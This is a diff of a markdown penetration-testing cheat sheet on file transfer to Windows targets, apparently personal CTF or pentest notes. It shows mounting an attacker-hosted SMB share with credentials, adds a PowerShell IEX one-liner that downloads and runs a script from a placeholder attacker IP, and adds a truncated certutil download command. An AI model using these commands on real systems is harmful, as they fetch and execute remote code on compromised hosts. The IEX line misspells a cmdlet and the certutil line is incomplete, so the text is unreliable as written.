@@ -1,4 +1,4 @@
-## Windows
+# Windows
 
 ### impacket-smbserver. Useful when transferring through evilwinrm
 On attacker machine. 
@@ -13,4 +13,16 @@ $cred = New-Object System.Management.Automation.PSCredential(<'AnyUser'>, $pass)
 New-PSDrive -Name <UserFromLastStep> -PSProvider Filesystem -Credential $cred -Root \\<Attacker.IP.Address.>\<NameOfServer>
 ```
 
-## Linux
+### Powershell IEX
+```
+IEX(New-WebObject Net.WebClient).downloadString('http://<attacker.ip>:<port>/<file-to-download>')
+```
+
+### Certutil
+```
+certutil.exe -urlcache -f 
+```
+
+
+
+# Linux
